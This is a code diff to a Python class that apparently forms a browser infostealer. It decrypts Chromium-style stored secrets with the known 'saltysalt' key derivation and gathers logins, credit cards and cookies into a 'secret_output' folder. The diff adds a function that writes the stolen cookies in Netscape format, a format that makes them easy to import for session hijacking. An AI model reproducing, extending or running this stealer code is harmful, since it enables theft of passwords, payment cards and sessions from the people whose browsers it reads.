@@ -97,36 +97,18 @@ class Broswer:
                 self.cookies_path.append({browser_name: cookies_data})
 
     def decrypter(self, cipher_text, key):
-        if len(cipher_text) < 3:
-            raise ValueError("Ciphertext length is invalid")
-
         iv = bytes([32] * 16)
-
         key = key.encode("utf-8")
         derived_key = hashlib.pbkdf2_hmac('sha1', key, b'saltysalt', 1003)[:16]
-
         ciphertext = cipher_text[3:]
-
-        # Add padding to Base64 string if necessary
-        missing_padding = len(ciphertext) % 4
-        if missing_padding:
-            ciphertext += b'=' * (4 - missing_padding)
-
-        try:
-            ciphertext = base64.b64decode(ciphertext)
-        except Exception as e:
-            print(f"[-] Error decoding Base64: {e}")
-            return None
-
         cipher = AES.new(derived_key, AES.MODE_CBC, iv)
 
         try:
             decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
         except (ValueError, UnicodeDecodeError) as e:
             print(f"[-] Error during decryption: {e}")
-            return None
+            return cipher_text
 
-        print(decrypted_data)
         return decrypted_data
 
               
@@ -216,12 +198,12 @@ class Broswer:
         if self.cookies:
             for cookie in self.cookies:
                 content_type = cookie["content_type"] + "_"
-                content_type += "".join(random.choices(string.ascii_lowercase, k=4)) + ".csv"
+                content_type += "".join(random.choices(string.ascii_lowercase, k=4)) + ".txt"
                 browser_path = secret_output / cookie["browser"] 
                 if not browser_path.exists():
                     browser_path.mkdir(parents=True, exist_ok=True)
                 cookie_path = browser_path / content_type
-                write_dict_to_csv(cookie_path, cookie["data"])
+                write_cookies_to_netscape_file(cookie_path, cookie["data"])
                      
     def browse_browser_data(self):
         # Read browser logins, credit_cards, and cookies
@@ -295,6 +277,26 @@ def write_dict_to_csv(filename, dict_data):
             writer.writeheader()
             for d in dict_data:
                 writer.writerow(d)
+
+
+def write_cookies_to_netscape_file(cookie_path, cookies):
+    with open(cookie_path, 'w') as file:
+
+        # Write each cookie in the Netscape format
+        for cookie in cookies:
+            # Determine if the domain should be prefixed with a dot
+            domain_prefix = '.' if cookie["host_key"].startswith('.') else ''
+            # Format: domain  include_subdomains  path  secure  expiration  name  value
+            line = "\t".join([
+                domain_prefix + cookie["host_key"],  # Domain
+                "TRUE" if domain_prefix else "FALSE",  # Include subdomains
+                cookie["path"],  # Path
+                "TRUE" if cookie["is_secure"] else "FALSE",  # Secure
+                str(cookie["expires_utc"]),  # Expiration (in UNIX time)
+                cookie["name"],  # Name
+                cookie["value"]  # Value
+            ])
+            file.write(line + "\n")
               
 def run_command(command):
     cmd = shlex.split(command)
